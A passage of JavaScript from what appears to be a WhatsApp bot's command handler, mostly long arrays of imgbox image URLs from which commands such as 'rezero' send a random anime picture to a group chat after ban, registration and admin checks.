n2zTlM_t.png','https://thumbs2.imgbox.com/45/f8/VUjBT9Od_t.png','https://thumbs2.imgbox.com/ac/d7/t3CZAlzY_t.png','https://thumbs2.imgbox.com/9a/a8/Y3LM0VhA_t.png','https://thumbs2.imgbox.com/24/c9/4Zcr85Kl_t.jpg','https://thumbs2.imgbox.com/e5/cb/vIUyszpn_t.jpg','https://thumbs2.imgbox.com/99/65/eUEAL0oA_t.jpg','https://thumbs2.imgbox.com/a3/57/inUZgudl_t.jpg','https://thumbs2.imgbox.com/0b/a5/ozNaJUrd_t.jpg','https://thumbs2.imgbox.com/8d/09/ibQRs98c_t.jpg','https://thumbs2.imgbox.com/f9/d6/89s3qb8i_t.jpg','https://thumbs2.imgbox.com/da/4c/M8MoIK9y_t.png','https://thumbs2.imgbox.com/04/86/MZ6skBnr_t.png','https://thumbs2.imgbox.com/20/98/53nfepSJ_t.png','https://thumbs2.imgbox.com/0b/1a/vlIOWEyp_t.jpg','https://thumbs2.imgbox.com/b0/54/f9fwEVfL_t.jpg','https://thumbs2.imgbox.com/c1/30/Z2ETtqEU_t.jpg','https://thumbs2.imgbox.com/a5/1e/qo9dEQ5a_t.png','https://thumbs2.imgbox.com/84/a2/CYaDEgPj_t.png','https://thumbs2.imgbox.com/fe/22/q9JzqCO3_t.png','https://thumbs2.imgbox.com/d0/69/FAVSP4Ss_t.png','https://thumbs2.imgbox.com/23/78/n2doRD3t_t.jpg','https://thumbs2.imgbox.com/d8/6c/U41ZiO5X_t.jpg','https://thumbs2.imgbox.com/a9/a0/rqqdeGVx_t.jpg','https://thumbs2.imgbox.com/ab/2e/rsYB4Y6A_t.jpg','https://thumbs2.imgbox.com/11/45/7uXtgyKe_t.jpg','https://thumbs2.imgbox.com/3b/32/H0Ya7cUn_t.png','https://thumbs2.imgbox.com/5d/f4/b2P6cjCt_t.png','https://thumbs2.imgbox.com/4f/81/tvkVn5Hn_t.png','https://thumbs2.imgbox.com/43/1b/jtmtlfe7_t.jpg','https://thumbs2.imgbox.com/67/97/7S2DdXHA_t.jpg','https://thumbs2.imgbox.com/8a/f7/BpVQpcBE_t.jpg','https://thumbs2.imgbox.com/70/ee/zkqzWjhR_t.jpg','https://thumbs2.imgbox.com/62/43/TqlOi3jG_t.jpg','https://thumbs2.imgbox.com/d1/46/cpDa5C9D_t.png','https://thumbs2.imgbox.com/3b/ec/x9XkTiH6_t.png','https://thumbs2.imgbox.com/c5/e2/jwPVsinf_t.jpg','https://thumbs2.imgbox.com/b0/6d/2VmbZV2z_t.jpg','https://thumbs2.imgbox.com/94/3a/APSsvIo5_t.jpg','https://thumbs2.imgbox.com/7d/f4/p4Xk7dPR_t.jpg','https://thumbs2.imgbox.com/52/6d/PPg9ofqP_t.jpg','https://thumbs2.imgbox.com/d6/e7/LQyChVJf_t.png','https://thumbs2.imgbox.com/76/79/dhfraor0_t.jpg','https://thumbs2.imgbox.com/16/d6/HztRvyuy_t.png','https://thumbs2.imgbox.com/77/44/IIovfh4D_t.png','https://thumbs2.imgbox.com/6a/40/uHRW9j8g_t.jpg','https://thumbs2.imgbox.com/19/e5/Ig21htAV_t.jpg','https://thumbs2.imgbox.com/65/53/CwlYBU5u_t.jpg','https://thumbs2.imgbox.com/f7/96/uKYFpkBJ_t.png','https://thumbs2.imgbox.com/62/ec/ydHACUrY_t.jpg','https://thumbs2.imgbox.com/e6/d9/ZgMkweH7_t.png','https://thumbs2.imgbox.com/7c/88/6xAMjMR1_t.png','https://thumbs2.imgbox.com/1d/e9/uWtow5Ni_t.png','https://thumbs2.imgbox.com/4f/1a/ODXFuq53_t.png','https://thumbs2.imgbox.com/b2/ac/NGFlZ0SI_t.png','https://thumbs2.imgbox.com/ae/c5/6DxLRkt7_t.png','https://thumbs2.imgbox.com/d7/b1/UBrsnELc_t.png','https://thumbs2.imgbox.com/f3/ce/upVivvjU_t.jpg','https://thumbs2.imgbox.com/f8/6e/kCerOOc1_t.jpg','https://thumbs2.imgbox.com/d0/c7/hap8Ppbx_t.jpg','https://thumbs2.imgbox.com/2e/b7/VaIG06vL_t.jpg','https://thumbs2.imgbox.com/b7/e0/tgTHCRmP_t.jpg','https://thumbs2.imgbox.com/a3/8b/Y2MQYU4T_t.jpg','https://thumbs2.imgbox.com/28/6f/sO3YkQe4_t.jpg','https://thumbs2.imgbox.com/b9/9c/xFCTMoWZ_t.jpg','https://thumbs2.imgbox.com/15/c6/sxcs5YE4_t.jpg','https://thumbs2.imgbox.com/f8/d0/gesgZcHM_t.png','https://thumbs2.imgbox.com/f2/e7/kUCBol6R_t.jpg','https://thumbs2.imgbox.com/dc/a8/ORbTcAYa_t.jpg','https://thumbs2.imgbox.com/e3/0a/CCSJyyWk_t.png','https://thumbs2.imgbox.com/2e/f4/Vgvs6qZz_t.png','https://thumbs2.imgbox.com/d2/8c/pnSkrq3U_t.png','https://thumbs2.imgbox.com/23/2a/6DLkhqc2_t.png','https://thumbs2.imgbox.com/b5/18/qYkREeuv_t.png','https://thumbs2.imgbox.com/a0/5b/yefbDYIT_t.jpg','https://thumbs2.imgbox.com/7b/54/an1BA5DF_t.jpg','https://thumbs2.imgbox.com/4b/d8/69k3VPBg_t.jpg','https://thumbs2.imgbox.com/17/6d/QJAKFFtB_t.png','https://thumbs2.imgbox.com/d2/46/h8IA1N7s_t.jpg','https://thumbs2.imgbox.com/2d/19/qSk5ElhM_t.jpg','https://thumbs2.imgbox.com/14/9f/qwFXPRwp_t.jpg','https://thumbs2.imgbox.com/87/4c/EfqMoysA_t.png','https://thumbs2.imgbox.com/76/9b/2o0rgHs1_t.jpg','https://thumbs2.imgbox.com/6b/6e/1Zxg1mXW_t.png','https://thumbs2.imgbox.com/55/b2/zW7ANd0I_t.png','https://thumbs2.imgbox.com/c5/2b/dBoogGuP_t.jpg','https://thumbs2.imgbox.com/1e/7d/df8rlSk6_t.jpg','https://thumbs2.imgbox.com/24/d5/6WQDK9Ik_t.jpg','https://thumbs2.imgbox.com/7a/ed/1Hy3whrD_t.jpg','https://thumbs2.imgbox.com/99/64/5OG1FFpO_t.png','https://thumbs2.imgbox.com/d9/19/bnx3hMaU_t.jpg','https://thumbs2.imgbox.com/a9/76/pHedzXmB_t.png','https://thumbs2.imgbox.com/aa/25/N0MRxOsp_t.jpg','https://thumbs2.imgbox.com/f9/1e/PYPOsEMM_t.jpg','https://thumbs2.imgbox.com/b3/3d/tx9FVXDt_t.jpg','https://thumbs2.imgbox.com/e6/16/h6ZsIbrz_t.jpg','https://thumbs2.imgbox.com/c3/7c/aWWjCQvm_t.jpg','https://thumbs2.imgbox.com/e5/ff/V2os6m1a_t.png','https://thumbs2.imgbox.com/4a/de/lkjewr6n_t.jpg','https://thumbs2.imgbox.com/80/a5/zDHowJHM_t.jpg','https://thumbs2.imgbox.com/f5/4f/9Dz59mv9_t.png','https://thumbs2.imgbox.com/3d/f6/wnhnn6jQ_t.png','https://thumbs2.imgbox.com/86/d0/6gVGdANA_t.jpg','https://thumbs2.imgbox.com/b7/09/gni5VzfE_t.png','https://thumbs2.imgbox.com/0d/14/67opLf6Z_t.jpg','https://thumbs2.imgbox.com/86/f6/8DQOpAGj_t.jpg','https://thumbs2.imgbox.com/96/7d/ncFyaivM_t.jpg','https://thumbs2.imgbox.com/a5/09/1NkLESVo_t.jpg','https://thumbs2.imgbox.com/00/8c/BvEp5pOW_t.png','https://thumbs2.imgbox.com/92/ba/sEkseer4_t.png','https://thumbs2.imgbox.com/85/c6/Mh2sg9q6_t.jpg','https://thumbs2.imgbox.com/02/4a/w1T1Demk_t.jpg','https://thumbs2.imgbox.com/47/3a/vlVPh2ZO_t.jpg','https://thumbs2.imgbox.com/02/11/5pfL9Pmw_t.png','https://thumbs2.imgbox.com/2e/99/Q2uINWHr_t.png','https://thumbs2.imgbox.com/63/c0/9swlJ6sH_t.png','https://thumbs2.imgbox.com/19/d7/J8dFALM3_t.png','https://thumbs2.imgbox.com/91/2b/HqNe4Sat_t.png','https://thumbs2.imgbox.com/d9/5e/2Jveo0Id_t.png','https://thumbs2.imgbox.com/8e/75/vgfZzbC2_t.png','https://thumbs2.imgbox.com/b1/3b/CDaebCl9_t.jpg','https://thumbs2.imgbox.com/75/cd/1M8RTTRx_t.jpg','https://thumbs2.imgbox.com/cd/0e/9RztSG1s_t.png','https://thumbs2.imgbox.com/fa/86/eOscGVqu_t.jpg','https://thumbs2.imgbox.com/57/25/BwiVCsdc_t.png','https://thumbs2.imgbox.com/a7/47/I6BGWNsp_t.jpg','https://thumbs2.imgbox.com/dd/16/X1k58w22_t.jpg','https://thumbs2.imgbox.com/56/d9/ryB14pyX_t.png','https://thumbs2.imgbox.com/10/9d/S6AJJEkE_t.jpg','https://thumbs2.imgbox.com/41/fd/3tj2WgDT_t.jpg','https://thumbs2.imgbox.com/1e/d2/zPuzQVMz_t.jpg','https://thumbs2.imgbox.com/9c/0d/81bDZMpv_t.jpg','https://thumbs2.imgbox.com/b2/6d/npTa4Gku_t.jpg','https://thumbs2.imgbox.com/17/cc/OJBUngSp_t.jpg','https://thumbs2.imgbox.com/ea/fe/rDuNLnyn_t.jpg','https://thumbs2.imgbox.com/29/0a/Sdt9NAvp_t.jpg','https://thumbs2.imgbox.com/f4/39/Ig5whd20_t.jpg','https://thumbs2.imgbox.com/d7/1e/Kl7wRIwL_t.jpg','https://thumbs2.imgbox.com/a5/45/suV0WX0m_t.jpg','https://thumbs2.imgbox.com/6b/ae/xjvEBTQm_t.jpg','https://thumbs2.imgbox.com/16/ee/P8gCFtTL_t.png','https://thumbs2.imgbox.com/e6/b2/u49UXQqo_t.jpg','https://thumbs2.imgbox.com/d8/6c/aNBkGmFl_t.jpg','https://thumbs2.imgbox.com/7d/33/StRhJtKD_t.jpg','https://thumbs2.imgbox.com/f2/6c/RgLf7une_t.jpg','https://thumbs2.imgbox.com/c5/ce/xSuB4AUs_t.jpg','https://thumbs2.imgbox.com/eb/f9/va4R7U1D_t.jpg','https://thumbs2.imgbox.com/10/c3/W5LWNDz5_t.jpg','https://thumbs2.imgbox.com/59/06/8ruE7pdf_t.jpg','https://thumbs2.imgbox.com/f1/1f/Ol26YhUz_t.jpg','https://thumbs2.imgbox.com/cc/36/AEsinpqz_t.jpg','https://thumbs2.imgbox.com/ad/12/VxrNueD4_t.png','https://thumbs2.imgbox.com/7f/93/jJXZLOTw_t.png','https://thumbs2.imgbox.com/dc/25/ve344UQp_t.png','https://thumbs2.imgbox.com/86/92/iWKRCm2w_t.jpg','https://thumbs2.imgbox.com/ff/4e/L9HJXt18_t.jpg','https://thumbs2.imgbox.com/07/50/vc8SLQhx_t.jpg','https://thumbs2.imgbox.com/28/56/yViredeD_t.jpg','https://thumbs2.imgbox.com/5e/58/64VTXBdH_t.png','https://thumbs2.imgbox.com/1a/2e/KdO9iSDl_t.png','https://thumbs2.imgbox.com/8e/51/ycknmFQn_t.png','https://thumbs2.imgbox.com/b7/59/hpiWYJ2n_t.png','https://thumbs2.imgbox.com/68/71/63bMNgEa_t.png','https://thumbs2.imgbox.com/3c/70/eEep55Ze_t.jpg','https://thumbs2.imgbox.com/ab/b9/wHlIi1Zo_t.png','https://thumbs2.imgbox.com/62/33/DN1ig3X7_t.jpg','https://thumbs2.imgbox.com/12/ec/ZQzdK9BQ_t.jpg','https://thumbs2.imgbox.com/a9/be/junuPrKe_t.jpg','https://thumbs2.imgbox.com/de/09/MuEBCUme_t.png','https://thumbs2.imgbox.com/fe/e2/XpWRwPKF_t.jpg','https://thumbs2.imgbox.com/5c/7f/aIANZHIE_t.jpg','https://thumbs2.imgbox.com/d7/f6/NVMEeTme_t.png','https://thumbs2.imgbox.com/66/61/6QLSjP0W_t.jpg','https://thumbs2.imgbox.com/2c/3c/TeEauHib_t.png','https://thumbs2.imgbox.com/dc/83/ZI1B7duC_t.png','https://thumbs2.imgbox.com/69/bc/JDyZKDeq_t.jpg','https://thumbs2.imgbox.com/d5/96/lfdGO6CE_t.jpg','https://thumbs2.imgbox.com/51/75/FqqViJL6_t.jpg','https://thumbs2.imgbox.com/96/7a/kr3WrIKV_t.jpg','https://thumbs2.imgbox.com/48/30/pwppc3PB_t.jpg','https://thumbs2.imgbox.com/99/7f/PnNFArpr_t.png','https://thumbs2.imgbox.com/58/e8/7lWSqPF2_t.jpg','https://thumbs2.imgbox.com/aa/44/FhGu2IdQ_t.jpg','https://thumbs2.imgbox.com/ac/e8/96XwDcGW_t.jpg','https://thumbs2.imgbox.com/95/ac/znyJoftK_t.jpg','https://thumbs2.imgbox.com/d0/3f/kBVANzaJ_t.png','https://thumbs2.imgbox.com/34/00/yIZQMsVI_t.png','https://thumbs2.imgbox.com/44/25/euFMdhWE_t.jpg','https://thumbs2.imgbox.com/ad/d7/Id6UREkp_t.jpg','https://thumbs2.imgbox.com/6a/cc/N8zXdK0W_t.jpg','https://thumbs2.imgbox.com/f9/ca/MktEPjBW_t.jpg','https://thumbs2.imgbox.com/dd/05/IouOMVdM_t.jpg','https://thumbs2.imgbox.com/e7/70/5gA5K6nS_t.png','https://thumbs2.imgbox.com/70/0e/lzhMNPBr_t.png','https://thumbs2.imgbox.com/f8/29/gHN1BqnM_t.png','https://thumbs2.imgbox.com/5f/43/75N1yQla_t.jpg','https://thumbs2.imgbox.com/92/3e/2wWwCwdk_t.jpg','https://thumbs2.imgbox.com/5f/a3/RcQQYsoe_t.png','https://thumbs2.imgbox.com/31/91/FMyyOnPo_t.png','https://thumbs2.imgbox.com/02/3a/eiSlIa8R_t.jpg','https://thumbs2.imgbox.com/27/d7/nyFQyOqN_t.png','https://thumbs2.imgbox.com/a1/97/3Ad6rJja_t.jpg','https://thumbs2.imgbox.com/82/fd/WrMwQbBg_t.jpg','https://thumbs2.imgbox.com/65/dc/mxjTAxEr_t.png','https://thumbs2.imgbox.com/d6/fb/WbGisRT6_t.png','https://thumbs2.imgbox.com/2b/98/Iy4kYMex_t.png','https://thumbs2.imgbox.com/d4/e0/VrbaSsgc_t.jpg','https://thumbs2.imgbox.com/39/c5/xyNop7XV_t.png','https://thumbs2.imgbox.com/0d/39/a4ahUJZK_t.png','https://thumbs2.imgbox.com/99/7b/fx3OHSAk_t.png','https://thumbs2.imgbox.com/6a/03/xxF6KuK5_t.jpg','https://thumbs2.imgbox.com/31/24/DTbjXRGU_t.jpg','https://thumbs2.imgbox.com/de/2a/AJ6touSl_t.jpg','https://thumbs2.imgbox.com/c3/2d/iKPQPGaQ_t.jpg','https://thumbs2.imgbox.com/74/df/eXBxAWiu_t.png','https://thumbs2.imgbox.com/62/7d/j6jtp327_t.jpg','https://thumbs2.imgbox.com/24/61/7hWm0ihI_t.jpg','https://thumbs2.imgbox.com/67/a1/tzP5Kn6B_t.jpg','https://thumbs2.imgbox.com/6a/74/vDuK8cJk_t.png','https://thumbs2.imgbox.com/55/3e/QOeIqRlH_t.jpg','https://thumbs2.imgbox.com/84/1c/2Qbuhr3L_t.jpg','https://thumbs2.imgbox.com/3e/ee/pDvNm6Ho_t.jpg','https://thumbs2.imgbox.com/49/10/qq7kyJ3Z_t.jpg','https://thumbs2.imgbox.com/58/1c/pY48AzfG_t.jpg','https://thumbs2.imgbox.com/59/d0/h0pHZ9xl_t.jpg','https://thumbs2.imgbox.com/6a/1e/zkGHidwC_t.png','https://thumbs2.imgbox.com/f0/9c/tCddslgS_t.png','https://thumbs2.imgbox.com/37/d2/utHX5tD0_t.jpg','https://thumbs2.imgbox.com/dc/e1/0FzRH9pC_t.jpg','https://thumbs2.imgbox.com/b9/89/OWs9CbeQ_t.jpg','https://thumbs2.imgbox.com/31/9d/YHIHoRz2_t.jpg','https://thumbs2.imgbox.com/94/a9/84LiadXV_t.png','https://thumbs2.imgbox.com/9d/98/veZ6xM0U_t.jpg','https://thumbs2.imgbox.com/6f/4e/l6T3y9h3_t.jpg','https://thumbs2.imgbox.com/07/d4/xtMVn1vU_t.jpg','https://thumbs2.imgbox.com/d0/73/WSjQ1yob_t.jpg','https://thumbs2.imgbox.com/33/7d/1gXL5oiv_t.jpg','https://thumbs2.imgbox.com/d1/61/nDhfhwJp_t.jpg','https://thumbs2.imgbox.com/9a/67/RlAlRi4o_t.jpg','https://thumbs2.imgbox.com/05/f2/UDEYbQLS_t.jpg','https://thumbs2.imgbox.com/b7/44/apZqUa5v_t.jpg','https://thumbs2.imgbox.com/19/3a/tjC5DjtE_t.png','https://thumbs2.imgbox.com/16/74/IIFQLEFj_t.png','https://thumbs2.imgbox.com/31/1a/Rp2vPcpd_t.png','https://thumbs2.imgbox.com/da/56/Ivr8We0L_t.png','https://thumbs2.imgbox.com/f4/9c/fTvqIWPy_t.png','https://thumbs2.imgbox.com/5d/56/lyZ0Z5UR_t.png','https://thumbs2.imgbox.com/f9/81/cYkzbtY4_t.jpg','https://thumbs2.imgbox.com/ec/a9/vaIi4O12_t.jpg','https://thumbs2.imgbox.com/21/b8/Brnrpr3h_t.jpg','https://thumbs2.imgbox.com/cf/a1/ArI94dqN_t.jpg','https://thumbs2.imgbox.com/ed/c1/HwT1J1v5_t.jpg','https://thumbs2.imgbox.com/bb/96/4toIvjaJ_t.jpg','https://thumbs2.imgbox.com/70/63/Luu1WJ73_t.png','https://thumbs2.imgbox.com/9d/33/Q0zPjk5N_t.jpg','https://thumbs2.imgbox.com/b2/76/KYNZo1bZ_t.jpg','https://thumbs2.imgbox.com/7f/c4/5TnsdgdV_t.jpg','https://thumbs2.imgbox.com/57/d5/4WC14oGG_t.jpg','https://thumbs2.imgbox.com/b1/39/GYalrYmb_t.jpg','https://thumbs2.imgbox.com/8d/9d/Kn1anv1G_t.jpg','https://thumbs2.imgbox.com/59/ae/jjF8zF55_t.jpg','https://thumbs2.imgbox.com/a4/f0/RbY1jaoh_t.jpg','https://thumbs2.imgbox.com/23/90/3dqT7IAn_t.jpg','https://thumbs2.imgbox.com/38/72/lwl0PlKs_t.png','https://thumbs2.imgbox.com/b0/5a/ZAzdcLZV_t.jpg','https://thumbs2.imgbox.com/e8/b0/CWXJ5hKf_t.png','https://thumbs2.imgbox.com/ca/20/tNXdEPaT_t.jpg','https://thumbs2.imgbox.com/89/d3/rSoE46v7_t.jpg','https://thumbs2.imgbox.com/f4/b2/1jBXCEiB_t.jpg','https://thumbs2.imgbox.com/29/f9/GyFGU18o_t.jpg','https://thumbs2.imgbox.com/fc/e8/BbSSUNDc_t.jpg','https://thumbs2.imgbox.com/00/0a/1hxXbdqX_t.jpg','https://thumbs2.imgbox.com/7d/bb/LyRNAukm_t.jpg','https://thumbs2.imgbox.com/d6/53/C2yyNV3w_t.jpg','https://thumbs2.imgbox.com/73/b6/NTgza9qo_t.jpg','https://thumbs2.imgbox.com/c2/d0/jSFrqub5_t.jpg','https://thumbs2.imgbox.com/6a/be/aX6FgPEk_t.jpg','https://thumbs2.imgbox.com/9f/82/CqqPrmdl_t.jpg','https://thumbs2.imgbox.com/10/22/I2EmoKNY_t.jpg','https://thumbs2.imgbox.com/8a/9c/CvHnNoE1_t.jpg','https://thumbs2.imgbox.com/3c/d7/rtuVFFxe_t.jpg','https://thumbs2.imgbox.com/d5/7f/qfJ8bWCM_t.jpg','https://thumbs2.imgbox.com/e4/77/D2BV55j7_t.jpg','https://thumbs2.imgbox.com/d6/71/9oK6BBAa_t.jpg','https://thumbs2.imgbox.com/c6/85/RkRUqcjP_t.jpg','https://thumbs2.imgbox.com/65/66/u0nCOBkJ_t.jpg','https://thumbs2.imgbox.com/05/e5/uANoWTWE_t.jpg','https://thumbs2.imgbox.com/f0/69/h6h0hbkX_t.png','https://thumbs2.imgbox.com/81/b8/XtPNDRJb_t.jpg','https://thumbs2.imgbox.com/69/12/JBgkS8T0_t.jpg','https://thumbs2.imgbox.com/9f/d3/dh3azH0z_t.png','https://thumbs2.imgbox.com/61/8d/NNG0e1Fl_t.png','https://thumbs2.imgbox.com/18/bb/dpIMzrfL_t.jpg','https://thumbs2.imgbox.com/a2/5f/kKCOrOVp_t.png','https://thumbs2.imgbox.com/95/64/j8Gk45N2_t.jpg','https://thumbs2.imgbox.com/2a/b9/Tf1yGz81_t.png','https://thumbs2.imgbox.com/16/7f/dMUWBjvV_t.jpg','https://thumbs2.imgbox.com/42/1d/I5GIysKZ_t.png','https://thumbs2.imgbox.com/09/14/T7RODmOl_t.png','https://thumbs2.imgbox.com/e5/73/yh6oYEsn_t.png','https://thumbs2.imgbox.com/50/96/vXue2DT6_t.jpg','https://thumbs2.imgbox.com/c0/5f/1TnOIrzI_t.png','https://thumbs2.imgbox.com/a2/8d/tn0vM25A_t.jpg','https://thumbs2.imgbox.com/c9/a5/xvhameMn_t.jpg','https://thumbs2.imgbox.com/44/68/3DoLzJCB_t.jpg','https://thumbs2.imgbox.com/27/cb/12KUhata_t.png','https://thumbs2.imgbox.com/ce/e7/k2xTJwxU_t.png','https://thumbs2.imgbox.com/b6/ca/mBfmqLp2_t.png','https://thumbs2.imgbox.com/81/70/5iOzeMT1_t.jpg','https://thumbs2.imgbox.com/ad/87/Jb1M1xaM_t.png','https://thumbs2.imgbox.com/39/23/Bw7kFWqc_t.png','https://thumbs2.imgbox.com/c7/98/ioprD872_t.png','https://thumbs2.imgbox.com/94/dd/r0grKLPc_t.png','https://thumbs2.imgbox.com/0c/1e/jVWePPum_t.jpg','https://thumbs2.imgbox.com/1d/17/agwr3nyl_t.png','https://thumbs2.imgbox.com/6b/60/cadR1Oil_t.jpg','https://thumbs2.imgbox.com/cd/f3/8diCty8G_t.jpg','https://thumbs2.imgbox.com/db/9b/j6aB7U0N_t.jpg','https://thumbs2.imgbox.com/a0/1e/aONOOWfw_t.jpg','https://thumbs2.imgbox.com/6a/98/YkLesbzh_t.png','https://thumbs2.imgbox.com/d5/a7/cc7dGWDQ_t.jpg','https://thumbs2.imgbox.com/2b/3c/LX0Us1ZF_t.png','https://thumbs2.imgbox.com/28/1f/YkzSrbdV_t.jpg','https://thumbs2.imgbox.com/f1/8c/N5gceQxX_t.jpg','https://thumbs2.imgbox.com/cf/77/toeIFc0e_t.png','https://thumbs2.imgbox.com/7c/75/xGMgJ4Tp_t.png','https://thumbs2.imgbox.com/a9/c3/0tjMOOtV_t.jpg','https://thumbs2.imgbox.com/2f/f4/VdvQmI4z_t.jpg','https://thumbs2.imgbox.com/08/6c/3OZlXyW0_t.png','https://thumbs2.imgbox.com/09/57/JHJe5Oz3_t.jpg','https://thumbs2.imgbox.com/2e/cf/8GKgwZvH_t.jpg','https://thumbs2.imgbox.com/26/c6/bS37xiBj_t.png','https://thumbs2.imgbox.com/9c/e4/UNzMg0UX_t.jpg','https://thumbs2.imgbox.com/68/f2/63GfT2LM_t.png','https://thumbs2.imgbox.com/c6/93/1RPqmihZ_t.png','https://thumbs2.imgbox.com/82/e5/EZsCuZCC_t.png','https://thumbs2.imgbox.com/1e/f2/FgWUodDG_t.png','https://thumbs2.imgbox.com/88/12/8r7jnoHg_t.jpg','https://thumbs2.imgbox.com/c5/a3/a9yakzoC_t.jpg','https://thumbs2.imgbox.com/b3/3b/o4dQzGgR_t.png','https://thumbs2.imgbox.com/5b/6f/A11WAseV_t.jpg','https://thumbs2.imgbox.com/06/26/K8p5JukE_t.png','https://thumbs2.imgbox.com/77/a3/KmqHh3OU_t.png','https://thumbs2.imgbox.com/82/71/QlSQi0uR_t.png','https://thumbs2.imgbox.com/52/db/MYnzUtL6_t.jpg','https://thumbs2.imgbox.com/9d/15/HPxPIkAp_t.png','https://thumbs2.imgbox.com/28/2c/w3n2lq8n_t.png','https://thumbs2.imgbox.com/2e/4b/iqr7uwYc_t.png','https://thumbs2.imgbox.com/4e/b3/924hXIlW_t.png','https://thumbs2.imgbox.com/ba/6e/bR4HUdME_t.jpg','https://thumbs2.imgbox.com/c8/dd/KnOFwqs4_t.jpg','https://thumbs2.imgbox.com/fd/15/CxQzRvsJ_t.jpg','https://thumbs2.imgbox.com/2f/7f/CfjlZGHQ_t.jpg','https://thumbs2.imgbox.com/6d/a5/El6wfkaY_t.jpg','https://thumbs2.imgbox.com/55/61/dzFUsi6V_t.png']
let elm = kann1[Math.floor(Math.random() * kann1.length)]
dragonmaid = await getBuffer(elm)
cnf.sendMessage(from, dragonmaid, image, {quote: mek, caption: 'Aquí tienes 💕🦈'})
addFilter(from)
break
					
case prefix+'rezero':
if (isBanned) return  reply(mess.banned) 
if (!isRegistered) return reply(ind.noregis())		
if (!isBotGroupAdmins) return reply(mess.only.Badmin)	  
const emili =['https://thumbs2.imgbox.com/19/4a/edf0FwgZ_t.jpg','https://thumbs2.imgbox.com/d7/5d/bbU6knYB_t.jpg','https://thumbs2.imgbox.com/a4/34/cEHE2rAR_t.jpg','https://thumbs2.imgbox.com/e6/99/4i27uXF0_t.jpg','https://thumbs2.imgbox.com/de/d2/jU5euhKK_t.jpg','https://thumbs2.imgbox.com/e5/02/Jbd8KvBA_t.jpg','https://thumbs2.imgbox.com/a2/31/YfUiBxWp_t.jpg','https://thumbs2.imgbox.com/92/ff/nuM6fMce_t.jpg','https://thumbs2.imgbox.com/d4/61/bzwm3Waj_t.jpg','https://thumbs2.imgbox.com/c0/23/ghUp2OZk_t.jpg','https://thumbs2.imgbox.com/17/be/Q0VlSdKr_t.jpg','https://thumbs2.imgbox.com/95/42/CyymhFKx_t.jpg','https://thumbs2.imgbox.com/f1/3d/fOnqmYwS_t.jpg','https://thumbs2.imgbox.com/99/2d/tkWOfT69_t.jpg','https://thumbs2.imgbox.com/e0/58/u3mTZGWP_t.jpg','https://thumbs2.imgbox.com/52/e9/ygOUrxaB_t.jpg','https://thumbs2.imgbox.com/4f/58/j5e5GVqW_t.jpg','https://thumbs2.imgbox.com/e5/0d/Cpp3D7qx_t.jpg','https://thumbs2.imgbox.com/1b/8e/rGOS3foe_t.jpg','https://thumbs2.imgbox.com/82/4e/tyLcnIp0_t.jpg','https://thumbs2.imgbox.com/74/8e/OXwQ2fxv_t.jpg','https://thumbs2.imgbox.com/34/17/HdyWoEEk_t.jpg','https://thumbs2.imgbox.com/b3/ab/KgwABjrM_t.jpg','https://thumbs2.imgbox.com/98/23/2F83DE7r_t.jpg','https://thumbs2.imgbox.com/13/b0/ukfSLWVM_t.jpg','https://thumbs2.imgbox.com/82/f2/rIsv7XP8_t.jpg','https://thumbs2.imgbox.com/0b/f3/rHzFslO9_t.jpg','https://thumbs2.imgbox.com/8e/3c/1oPRXMjD_t.jpg','https://thumbs2.imgbox.com/b7/f5/W3WEAEhP_t.jpg','https://thumbs2.imgbox.com/e4/d2/QghLwi2D_t.jpg','https://thumbs2.imgbox.com/a5/83/LLq7CUga_t.jpg','https://thumbs2.imgbox.com/5d/c1/C6eydPdB_t.jpg','https://thumbs2.imgbox.com/6c/1f/WYQAKa0k_t.jpg','https://thumbs2.imgbox.com/d8/88/R0yUnTEc_t.jpg','https://thumbs2.imgbox.com/5c/3e/P5u6XP3Q_t.jpg','https://thumbs2.imgbox.com/d6/24/7X77H4Ak_t.jpg','https://thumbs2.imgbox.com/fd/2f/KatD7ovL_t.jpg','https://thumbs2.imgbox.com/7f/bc/YPU2A8nG_t.jpg','https://thumbs2.imgbox.com/a8/11/hKPyNwTi_t.jpg','https://thumbs2.imgbox.com/71/a3/s2quwzM7_t.jpg','https://thumbs2.imgbox.com/48/f6/oTv8544O_t.jpg','https://thumbs2.imgbox.com/fa/c1/HC2dazgf_t.jpg','https://thumbs2.imgbox.com/33/c0/JPAtH4Lo_t.jpg','https://thumbs2.imgbox.com/2a/71/9CxMzUSb_t.jpg','https://thumbs2.imgbox.com/fb/70/g0CUlW7N_t.jpg','https://thumbs2.imgbox.com/20/57/lux7b0BA_t.jpg','https://thumbs2.imgbox.com/2f/49/qbqD837L_t.jpg','https://thumbs2.imgbox.com/ee/97/e639fIkz_t.jpg','https://thumbs2.imgbox.com/37/30/iTXaMid6_t.jpg','https://thumbs2.imgbox.com/f4/c1/T7KaGxYb_t.jpg','https://thumbs2.imgbox.com/32/2c/dLTQwYqT_t.jpg','https://thumbs2.imgbox.com/0a/6a/HPCylNNK_t.jpg','https://thumbs2.imgbox.com/37/f9/4fUtCU65_t.jpg','https://thumbs2.imgbox.com/48/cf/dJPVVj2a_t.jpg','https://thumbs2.imgbox.com/2b/36/Z7uiqUJY_t.jpg','https://thumbs2.imgbox.com/6f/b8/ei2ySKdd_t.jpg','https://thumbs2.imgbox.com/29/df/Ll75QFGv_t.jpg','https://thumbs2.imgbox.com/13/cb/AWFMVhsZ_t.jpg','https://thumbs2.imgbox.com/f4/e8/1s294UpL_t.jpg','https://thumbs2.imgbox.com/eb/c8/XBbaW7R7_t.jpg','https://thumbs2.imgbox.com/32/e2/NnWbpa5e_t.jpg','https://thumbs2.imgbox.com/2b/d1/rcM3eh8T_t.jpg','https://thumbs2.imgbox.com/a6/24/Lw1ULoP0_t.jpg','https://thumbs2.imgbox.com/f7/9e/pS5i4SHb_t.jpg','https://thumbs2.imgbox.com/88/1c/AZOvvQhk_t.jpg','https://thumbs2.imgbox.com/c2/65/oXLw117U_t.jpg','https://thumbs2.imgbox.com/1e/b2/fVmxPfBP_t.jpg','https://thumbs2.imgbox.com/42/18/NllfUwov_t.jpg','https://thumbs2.imgbox.com/b4/a5/gLLDT5qn_t.jpg','https://thumbs2.imgbox.com/a2/66/206SYz6P_t.jpg','https://thumbs2.imgbox.com/9c/23/5QaYqUiO_t.jpg','https://thumbs2.imgbox.com/50/9a/UvGSKqg8_t.jpg','https://thumbs2.imgbox.com/ab/cc/YRk7KlEj_t.jpg','https://thumbs2.imgbox.com/aa/bb/BznMyaBG_t.jpg','https://thumbs2.imgbox.com/68/a5/CWNnA6Sr_t.jpg','https://thumbs2.imgbox.com/7d/f9/g9neCFuT_t.jpg','https://thumbs2.imgbox.com/7a/dd/17RhTNHB_t.j